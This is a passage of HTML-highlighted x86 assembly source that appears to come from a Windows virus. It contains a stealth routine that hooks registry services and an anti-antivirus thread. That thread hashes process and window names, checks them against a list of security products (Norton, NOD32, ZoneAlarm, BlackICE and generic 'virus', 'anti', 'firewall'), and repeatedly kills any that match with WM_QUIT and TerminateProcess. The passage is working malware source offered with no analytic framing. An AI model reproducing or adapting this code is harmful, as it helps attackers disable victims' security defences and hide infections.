            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__bad_hook</span><span class="sc0">
</span><span class="sc5">__ok_hook</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">realHook_DS</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">hookHook_DS</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">DDB_regenarate</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">c</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0bah</span><span class="sc0">                    </span><span class="sc1">; edx</span><span class="sc0">
</span><span class="sc5">service_ptr_table</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__service_table</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">_RegEnumKey</span><span class="sc0">
</span><span class="sc5">@_RegEnumKey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">_RegOpenKey</span><span class="sc0">
</span><span class="sc5">@_RegOpenKey</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">_RegCreateKey</span><span class="sc0">
</span><span class="sc5">@_RegCreateKey</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">_RegDeleteKey</span><span class="sc0">
</span><span class="sc5">@_RegDeleteKey</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">Hook_DS</span><span class="sc0">
</span><span class="sc5">@Hook_DS</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">__service_table</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NUMBA_HOOKED_SERVICES</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cycle</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DDB_regenarate</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">stealthcode_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">stealthcode_start</span><span class="sc0">

</span><span class="sc5">stealth_thread</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">
            
</span><span class="sc5">anti_av_thread</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">wh</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">buffer</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc4">:</span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">pid</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">p_entry</span><span class="sc4">:</span><span class="sc5">PROCESSENTRY32</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">avdelta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

</span><span class="sc5">_AV</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">avdelta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">__av_ebp_patch</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">__av_ebx_patch</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">__av_ebp_patch_</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            
</span><span class="sc5">__kill_av</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__av_win_enum</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_EnumWindows</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">TH32CS_SNAPPROCESS</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreateToolhelp32Snapshot</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end__snapshot</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">p_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.dwSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">PROCESSENTRY32</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Process32First</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
</span><span class="sc5">__cycle_procs</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__proc_done</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetCurrentProcessId</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry.th32ProcessID</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__next_proc</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry.szExeFile</span><span class="sc0">
</span><span class="sc5">__slash</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">__endsz</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__slash</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__endsz</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowercase</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">__hasherize</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__out</span><span class="sc0">       
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__hasherize</span><span class="sc0">

</span><span class="sc5">__out</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">good_namez</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">good_namez_numba</span><span class="sc0">
            </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__next_proc</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bad_namez</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bad_namez_numba</span><span class="sc0">
            </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__next_proc</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_entry.th32ProcessID</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROCESS_TERMINATE</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_OpenProcess</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_TerminateProcess</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
</span><span class="sc5">__next_proc</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">p_entry</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Process32Next</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cycle_procs</span><span class="sc0">
            
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
</span><span class="sc5">__proc_done</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">p_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
</span><span class="sc5">__end__snapshot</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__kill_av</span><span class="sc0">

</span><span class="sc5">__av_win_enum</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0"> 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__av_ebp_patch</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pshd.Arg1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__av_ebx_patch</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">__av_ebp_patch_</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetWindowThreadProcessId</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pid</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end__end</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">512</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetWindowTextA</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__end__end</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lowercase</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_names_numba</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_namez_hashes</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">av_names_length</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">

</span><span class="sc5">__process_string</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">js</span><span class="sc0">  </span><span class="sc5">__too_lil_end</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__too_lil_end</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc5">__hash</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__hash</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__found</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__cycle</span><span class="sc0">
            
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ebx</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__process_string</span><span class="sc0">
            
</span><span class="sc5">__end__kend</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">__end__end</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">__too_lil_end</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__end__kend</span><span class="sc0">

</span><span class="sc5">__found</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">WM_QUIT</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wh</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_PostMessageA</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">pid</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PROCESS_TERMINATE</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_OpenProcess</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_TerminateProcess</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">retn</span><span class="sc0">
            
</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">h_av_thread</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">anti_av_thread</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Thread</span><span class="sc0">               </span><span class="sc1">; BUG!!! FIXAJ rel. adr.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">h_av_thread</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_AV</span><span class="sc0">

</span><span class="sc5">av_namez_hashes</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">whash</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">firewall</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">process</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">zonealarm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">amon</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nod32</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">blackice</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kill98</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">norton</span><span class="sc4">&gt;</span><span class="sc0">
